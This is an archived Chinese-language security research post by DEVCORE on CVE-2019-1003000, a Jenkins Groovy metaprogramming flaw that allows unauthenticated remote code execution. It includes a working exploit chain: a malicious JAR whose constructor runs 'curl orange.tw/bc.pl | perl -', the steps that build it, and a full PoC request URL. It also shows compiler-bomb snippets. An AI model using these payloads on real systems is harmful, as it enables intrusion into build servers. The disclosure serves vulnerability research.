---
type: Article
title: Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!
description: "The article abuses compile-time Groovy metaprogramming in Jenkins Pipeline syntax validation: `@GrabResolver` fetches a malicious JAR and Groovy’s runner-service loading instantiates attacker code before normal execution or sandbox checks. Combined with a previously described Jenkins routing ACL bypass, the chain yields unauthenticated remote code execution."
resource: "https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/"
tags: [article, webseclist-reference, devcore, jenkins, rce, ci-cd, sandbox-escape, code-injection, supply-chain, attack-chain, auth-bypass, java, cve, owasp-a01-2021, owasp-a06-2021, owasp-a08-2021]
generated:
  by: webseclist-refs/1
  at: "2026-10-02T20:55:28+00:00"
status: stable
stale_after: 2027-10-02
sources:
  - id: original
    resource: "https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/"
    title: Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!
    author: d3vc0r3
also_at: []
authors:
  - d3vc0r3
canonical_url: ""
cited_by:
  - "2019.md:8"
commit: ""
content_sha256: 8ff09660093d1fe3eac9643947f5233608a4200cead5efe2c7a307517834032f
depth: full
depth_reason: default
kind: article
language: ""
licence: unknown
original_url: "https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/"
published: ""
publisher: DEVCORE 戴夫寇爾
publisher_english: DEVCORE
raw_sha256: bd51857a977944df4b05aeab5d2c99ec704dc53c77eb84e33aafdc6b6f3ccf0a
retrieved_from: "https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/"
retrieved_kind: live
retrieved_utc: "2026-10-02T20:55:28+00:00"
slug: devcore-hacking-jenkins-part-2-abusing-meta-programming-unauthenticated-rce
snapshot: ""
title_english: ""
translation_file: devcore-hacking-jenkins-part-2-abusing-meta-programming-unauthenticated-rce_translate.md
translation_of: ""
---

# Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!

**Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!** - d3vc0r3, DEVCORE 戴夫寇爾.

- Publisher in English: DEVCORE
- Published: date not stated
- Original: <https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/>
- Preserved from: https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/ (live) on 2026-10-02
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so
it remains readable if the page goes offline. To read the original, follow the link above.

## Content (original)

_The source's own words. An English translation of this document is archived beside it as [`devcore-hacking-jenkins-part-2-abusing-meta-programming-unauthenticated-rce_translate.md`](devcore-hacking-jenkins-part-2-abusing-meta-programming-unauthenticated-rce_translate.md)._

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

[技術專欄](https://devco.re/blog/category/技術專欄)  [#Advisory](https://devco.re/blog/tag/Advisory/) [#CVE](https://devco.re/blog/tag/CVE/) [#RCE](https://devco.re/blog/tag/RCE/)

#  Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!

  [**](https://devco.re/blog/author/orange)  [Orange Tsai](https://devco.re/blog/author/orange) 2019-02-19

 ![](https://devco.re/assets/img/blog/20190219/cover.png)

---

[English Version](https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/) [中文版本](https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/)

嗨! 大家今天過得好嗎?

這篇文章是 Hacking Jenkins 系列的下集! 給那些還沒看過上篇文章的同學，可以訪問下面鏈結，補充一些基本知識及了解之前如何從 Jenkins 中的動態路由機制到串出各種不同的攻擊鏈!

- [Hacking Jenkins Part 1 - Play with Dynamic Routing ](https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/)

如上篇文章所說，為了最大程度發揮漏洞的效果，想尋找一個代碼執行的漏洞可以與 ACL 繞過漏洞搭配，成為一個不用認證的遠端代碼執行! 不過在最初的嘗試中失敗了，由於動態路由機制的特性，Jenkins 在遇到一些危險操作時(如 [Script Console](http://jenkins.local/script))都會再次的檢查權限! 導致就算可以繞過最前面的 ACL 層依然無法做太多事情!

直到 Jenkins 在 2018-12-05 發佈的 [Security Advisory](https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595) 修復了前述我所回報的動態路由漏洞! 為了開始撰寫這份技術文章(Hacking Jenkins 系列文)，我重新複習了一次當初進行代碼審查的筆記，當中對其中一個跳板(gadget)想到了一個不一樣的利用方式，因而有了這篇故事! 這也是近期我所寫過覺得比較有趣的漏洞之一，非常推薦可以仔細閱讀一下!

## 漏洞分析

---

要解釋這次的漏洞 [CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266) 必須要從 Pipeline 開始講起! 大部分開發者會選擇 Jenkins 作為 CI/CD 伺服器的其中一個原因是因為 Jenkins 提供了一個很強大的 Pipeline 功能，使開發者可以方便的去撰寫一些 Build Script 以完成自動化的編譯、測試及發佈! 你可以想像 Pipeline 就是一個小小的微語言可以去對 Jenkins 進行操作(而實際上 Pipeline 是基於 Groovy 的一個 DSL)

為了檢查使用者所撰寫的 Pipeline Script 有沒有語法上的錯誤(Syntax Error)，Jenkins 提供了一個介面給使用者檢查自己的 Pipeline! 這裡你可以想像一下，如果你是程式設計師，你要如何去完成這個功能呢? 你可以自己實現一個語法樹(AST, Abstract Syntax Tree)解析器去完成這件事，不過這太累了，最簡單的方式當然是套用現成的東西!

前面提到，Pipeline 是基於 Groovy 所實現的一個 DSL，所以 Pipeline 必定也遵守著 Groovy 的語法! 所以最簡單的方式是，只要 Groovy 可以成功解析(parse)，那就代表這份 Pipeline 的語法一定是對的! Jenkins 實作檢查的程式碼約是下面這樣子:

```
public JSON doCheckScriptCompile(@QueryParameter String value) {
    try {
        CpsGroovyShell trusted = new CpsGroovyShellFactory(null).forTrusted().build();
        new CpsGroovyShellFactory(null).withParent(trusted).build().getClassLoader().parseClass(value);
    } catch (CompilationFailedException x) {
        return JSONArray.fromObject(CpsFlowDefinitionValidator.toCheckStatus(x).toArray());
    }
    return CpsFlowDefinitionValidator.CheckStatus.SUCCESS.asJSON();
    // Approval requirements are managed by regular stapler form validation (via doCheckScript)
}

```

這裡使用了 [GroovyClassLoader.parseClass(…)](http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-) 去完成 Groovy 語法的解析! 值得注意的是，由於這只是一個 AST 的解析，在沒有執行 `execute()` 的方法前，任何危險的操作是不會被執行的，例如嘗試去解析這段 Groovy 代碼會發現其實什麼事都沒發生 :(

```
this.class.classLoader.parseClass('''
print java.lang.Runtime.getRuntime().exec("id")
''');

```

從程式開發者的角度來看，Pipeline 可以操作 Jenkins 那一定很危險，因此要用嚴格的權限保護住! 但這只是一段簡單的語法錯誤檢查，而且呼叫到的地方很多，限制太嚴格的權限只會讓自己綁手綁腳的!

上面的觀點聽起來很合理，就只是一個 AST 的解析而且沒有任何 `execute()` 方法應該很安全，但恰巧這裡就成為了我們第一個入口點! 其實第一次看到這段代碼時，也想不出什麼利用方法就先跳過了，直到要開始撰寫技術文章重新溫習了一次，我想起了說不定 Meta-Programming 會有搞頭!

## 什麼是 Meta-Programming

---

首先我們來解釋一下什麼是 Meta-Programming!

Meta-Programming 是一種程式設計的思維! Meta-Programming 的精髓在於提供了一個抽象層次給開發者用另外一種思維去撰寫更高靈活度及更高開發效率的代碼。其實 Meta-Programming 並沒有一個很嚴謹的定義，例如使用程式語言編譯所留下的 Metadata 去動態的產生程式碼，或是把程式自身當成資料，透過編譯器(compiler)或是直譯器(interpreter)去撰寫代碼都可以被說是一種 Meta-Programming! 而其中的哲學其實非常廣泛甚至已經可以被當成程式語言的一個章節來獨立探討!

大部分的文章或是書籍在解釋 Meta-Programming 的時候通常會這樣解釋:

> 用程式碼(code)產生程式碼(code)

如果還是很難理解，你可以想像程式語言中的 `eval(...)` 其實就是一種廣義上的 Meta-Programming! 雖然不甚精確，但用這個比喻可以快速的理解 Meta-Programming! 其實就是用程式碼(eval 這個函數)去產生程式碼(eval 出來的函數)! 在程式開發上，Meta-Programming 也有著極其多的應用，例如:

- C 語言中的 Macro
- C++ 的 Template
- Ruby (Ruby 本身就是一門將 Meta-Programming 發揮到極致的語言，甚至還有專門的[書1](http://shop.oreilly.com/product/9781934356470.do), [書2](http://shop.oreilly.com/product/9781941222126.do))
- Java 的 Annotation 註解
- 各種 DSL(Domain Specific Language) 應用，例如 [Sinatra](http://sinatrarb.com/) 及 [Gradle](https://gradle.org/)

而當我們在談論 Meta-Programming 時，依照作用的範圍我們大致分成 **(1)編譯時期** 及 **(2)執行時期**這兩種 Meta-Programming! 而我們今天的重點，就是在編譯時期的 Meta-Programming!

*P.S. 我也不是一位 Programming Language 大師，如有不精確或者覺得教壞小朋友的地方再請多多包涵 <(_ _)>*

## 如何利用

---

從前面的段落中我們發現 Jenkins 使用 [parseClass(…)](http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-) 去檢查語法錯誤，我們也想起了 Meta-Programming 可在編譯時期對程式碼做一些動態的操作! 設計一個編譯器(或解析器)是一件很麻煩的事情，裡面會有各種骯髒的實作或是奇怪的功能，所以一個很直覺的想法就是，是否可以透過編譯器一些副作用(Side Effect)去完成一些事情呢?

舉幾個淺顯易懂的例子，如 C 語言巨集擴展所造成的資源耗盡

```
#define a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
#define b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a
#define c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b
#define d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c
#define e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d
#define f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e
__int128 x[]={f,f,f,f,f,f,f,f};

```

編譯器的資源耗盡(用 18 bytes 產生 16G 的執行檔)

```
int main[-1u]={1};

```

或是用編譯器來幫你算費式數列

```
template<int n>
struct fib {
    static const int value = fib<n-1>::value + fib<n-2>::value;
};
template<> struct fib<0> { static const int value = 0; };
template<> struct fib<1> { static const int value = 1; };

int main() {
    int a = fib<10>::value; // 55
    int b = fib<20>::value; // 6765
    int c = fib<40>::value; // 102334155
}

```

從組合語言的結果可以看出這些值在編譯期間就被計算好填充進去，而不是執行期間!

```
$ g++ template.cpp -o template
$ objdump -M intel -d template
...
00000000000005fa <main>:
 5fa:   55                      push   rbp
 5fb:   48 89 e5                mov    rbp,rsp
 5fe:   c7 45 f4 37 00 00 00    mov    DWORD PTR [rbp-0xc],0x37
 605:   c7 45 f8 6d 1a 00 00    mov    DWORD PTR [rbp-0x8],0x1a6d
 60c:   c7 45 fc cb 7e 19 06    mov    DWORD PTR [rbp-0x4],0x6197ecb
 613:   b8 00 00 00 00          mov    eax,0x0
 618:   5d                      pop    rbp
 619:   c3                      ret
 61a:   66 0f 1f 44 00 00       nop    WORD PTR [rax+rax*1+0x0]
...

```

更多的例子你可以參考 StackOverflow 上的 [Build a Compiler Bomb](https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb) 這篇文章!

### 首次嘗試

---

回到我們的漏洞利用上，Pipeline 是基於 Groovy 上的一個 DSL 實作，而 Groovy 剛好就是一門對於 Meta-Programming 非常友善的語言! 翻閱著 Grovvy 官方的 [Meta-Programming 手冊](http://groovy-lang.org/metaprogramming.html) 開始尋找各種可以利用的方法! 在 2.1.9 章「測試協助」這個段落發現了 `@groovy.transform.ASTTest` 這個註解，仔細觀察它的敘述:

> `@ASTTest` is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer “explore” the AST during compilation and **perform assertions on the AST** rather than on the result of compilation. This means that this AST transformations gives access to the AST before the bytecode is produced. `@ASTTest` can be placed on any annotable node and requires two parameters:

什麼! 可以在 AST 上執行一個 assertion? 這不就是我們要的嗎? 趕緊先在本地寫個 Proof-of-Concept 嘗試是否可行:

```
this.class.classLoader.parseClass('''
@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec("touch pwned")
})
def x
''');

```

```
$ ls
poc.groovy

$ groovy poc.groovy
$ ls
poc.groovy  pwned

```

幹，可以欸! 但代誌並不是憨人想的那麼簡單! 嘗試在遠端 Jenkins 重現時，出現了:

> unable to resolve class org.jenkinsci.plugins.workflow.libs.Library

![](https://devco.re/assets/img/blog/20190219/1.png)

真是黑人問號，森77，這到底是三小啦!!!

認真追了一下 root cause 才發現是 [Pipeline Shared Groovy Libraries Plugin](https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin) 這個插件在作怪! 為了方便使用者可重複使用在編寫 Pipeline 常用到的功能，Jenkins 提供了這個插件可在 Pipeline 中引入自定義的函式庫! Jenkins 會在所有 Pipeline 執行前引入這個函式庫，而在編譯時期的 classPath 中並沒有相對應的函式庫因而導致了這個錯誤!

想解決這個問題很簡單，到 [Jenkins Plugin Manager](http://jenkins.local/pluginManager/) 中將 [Pipeline Shared Groovy Libraries Plugin](https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin) 移除即可解決這個問題並執行任意代碼!

不過這絕對不是最佳解! 這個插件會隨著 Pipeline 被自動安裝，為了要成功利用這個漏洞還得先要求管理員把它移除實在太蠢了! 因此這條路只能先打住，繼續尋找下一個方法!

### 再次嘗試

---

繼續閱讀 [Groovy Meta-Programming 手冊](http://groovy-lang.org/metaprogramming.html)，我們發現了另一個有趣的註解 `@Grab`，關於 `@Grab` 手冊中並沒有詳細的描述，但使用 Google 我們發現了另一篇文章 - [Dependency management with Grape](http://docs.groovy-lang.org/latest/html/documentation/grape.html)!

原來 Grape(`@Grab`) 是一個 Groovy 內建的動態 JAR 相依性管理程式! 可讓開發者動態的引入不在 classPath 上的函式庫! Grape 的語法如下:

```
@Grab(group='org.springframework', module='spring-orm', version='3.2.5.RELEASE')
import org.springframework.jdbc.core.JdbcTemplate

```

配合 `@grab` 的註解，可讓 Groovy 在編譯時期自動引入不存在於 classPath 中的 JAR 檔! 但如果你的目的只是要在一個有執行 Pipeline 權限的帳號上繞過原有 Pipeline 的 Sandbox 的話，這其實就足夠了! 例如你可以參考 [@adamyordan](https://github.com/adamyordan) 所提供的 [PoC](https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc)，在已知使用者帳號與密碼及權限足夠的情況下，達到遠端代碼執行的效果!

但在沒有帳號密碼及 `execute()` 的方法下，這只是一個簡單的語法樹解析器，你甚至無法控制遠端伺服器上的檔案，所以該怎麼辦呢? 我們繼續研究下去，並發現了一個很有趣的註解叫做 `@GrabResolver`，用法如下:

```
@GrabResolver(name='restlet', root='http://maven.restlet.org/')
@Grab(group='org.restlet', module='org.restlet', version='1.1.6')
import org.restlet

```

看到這個，聰明的你應該會很想把 `root` 改成惡意網址對吧! 我們來試試會怎麼樣吧!

```
this.class.classLoader.parseClass('''
@GrabResolver(name='restlet', root='http://orange.tw/')
@Grab(group='org.restlet', module='org.restlet', version='1.1.6')
import org.restlet
''')

```

```log
11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] "HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1" 404 185 "-" "Apache Ivy/2.4.0"

```

喔幹，真的會來存取欸! 到這裡我們已經確信了透過 Grape 可以讓 Jenkins 引入惡意的函式庫! 但下一個問題是，要如何執行代碼呢?

## 如何執行任意代碼?

---

在漏洞的利用中總是在研究如何從簡單的任意讀、任意寫到取得系統執行的權限! 從前面的例子中，我們已經可以透過 Grape 去寫入惡意的 JAR 檔到遠端伺服器，但要怎麼執行這個 JAR 檔呢? 這又是另一個問題!

跟進 Groovy 語言核心查看對於 [Grape 的實作](https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java)，我們知道網路層的抓取是透過 [groovy.grape.GrapeIvy](https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy) 這個類別來完成! 所以開始尋找實作中是否有任何可以執行代碼的機會! 其中，我們看到了一個有趣的方法 - [processOtherServices(…)](https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312):

```
void processOtherServices(ClassLoader loader, File f) {
    try {
        ZipFile zf = new ZipFile(f)
        ZipEntry serializedCategoryMethods = zf.getEntry("META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods")
        if (serializedCategoryMethods != null) {
            processSerializedCategoryMethods(zf.getInputStream(serializedCategoryMethods))
        }
        ZipEntry pluginRunners = zf.getEntry("META-INF/services/org.codehaus.groovy.plugins.Runners")
        if (pluginRunners != null) {
            processRunners(zf.getInputStream(pluginRunners), f.getName(), loader)
        }
    } catch(ZipException ignore) {
        // ignore files we can't process, e.g. non-jar/zip artifacts
        // TODO log a warning
    }
}

```

由於 JAR 檔案其實就是一個 ZIP 壓縮格式的子集，Grape 會檢查檔案中是否存在一些指定的入口點，其中一個 `Runner` 的入口點檢查引起了我們的興趣，持續跟進 [processRunners(…)](https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335) 的實作我們發現:

```
void processRunners(InputStream is, String name, ClassLoader loader) {
    is.text.readLines().each {
        GroovySystem.RUNNER_REGISTRY[name] = loader.loadClass(it.trim()).newInstance()
    }
}

```

這裡的 `newInstance()` 不就代表著可以呼叫到任意類別的 `Constructor` 嗎? 沒錯! 所以只需產生一個惡意的 JAR 檔，把要執行的類別全名放至 `META-INF/services/org.codehaus.groovy.plugins.Runners` 中即可呼叫指定類別的`Constructor` 去執行任意代碼! 完整的漏洞利用過程如下:

```
public class Orange {
    public Orange(){
        try {
            String payload = "curl orange.tw/bc.pl | perl -";
            String[] cmds = {"/bin/bash", "-c", payload};
            java.lang.Runtime.getRuntime().exec(cmds);
        } catch (Exception e) { }

    }
}

```

```
$ javac Orange.java
$ mkdir -p META-INF/services/
$ echo Orange > META-INF/services/org.codehaus.groovy.plugins.Runners
$ find .
./Orange.java
./Orange.class
./META-INF
./META-INF/services
./META-INF/services/org.codehaus.groovy.plugins.Runners

$ jar cvf poc-1.jar tw/
$ cp poc-1.jar ~/www/tw/orange/poc/1/
$ curl -I http://[your_host]/tw/orange/poc/1/poc-1.jar
HTTP/1.1 200 OK
Date: Sat, 02 Feb 2019 11:10:55 GMT
...

```

PoC:

```
http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
?value=
@GrabConfig(disableChecksums=true)%0a
@GrabResolver(name='orange.tw', root='http://[your_host]/')%0a
@Grab(group='tw.orange', module='poc', version='1')%0a
import Orange;

```

影片:

## 後記

---

到此，我們已經可以完整的控制遠端伺服器! 透過 Meta-Programming 在語法樹解析時期去引入惡意的 JAR 檔，再透過 Java 的 Static Initializer 特性去執行任意指令! 雖然 Jenkins 有內建的 Groovy Sandbox([Script Security Plugin](https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin))，但這個漏洞是在編譯階段而非執行階段，導致 Sandbox 毫無用武之處!

由於這是對於 Groovy 底層的一種攻擊方式，因此只要是所有可以碰觸到 Groovy 解析的地方皆有可能有漏洞產生! 而這也是這個漏洞好玩的地方，打破了一般開發者認為沒有執行就不會有問題的思維，對攻擊者來說也用了一個沒有電腦科學的理論知識背景不會知道的方法攻擊! 不然你根本不會想到 Meta-Programming! 除了我回報的 `doCheckScriptCompile(...)` 與 `toJson(...)` 兩個進入點外，在漏洞被修復後，[Mikhail Egorov](https://twitter.com/0ang3el) 也很快的找到了另外一個[進入點](https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292)去觸發這個漏洞!

除此之外，這個漏洞更可以與我前一篇 [Hacking Jenkins Part 1](https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/) 所發現的漏洞串起來，去繞過 Overall/Read 的限制成為一個名符其實不用認證的遠端代碼執行漏洞!(如果你有好好的讀完這兩篇文章，應該對你不是難事XD) 至於有沒有更多的玩法? 就交給大家自由發揮串出自己的攻擊鏈囉!

感謝大家的閱讀，Hacking Jenkins 系列文就在這裡差不多先告一個段落囉! 未來將會再發表更多有趣的技術研究敬請期待!
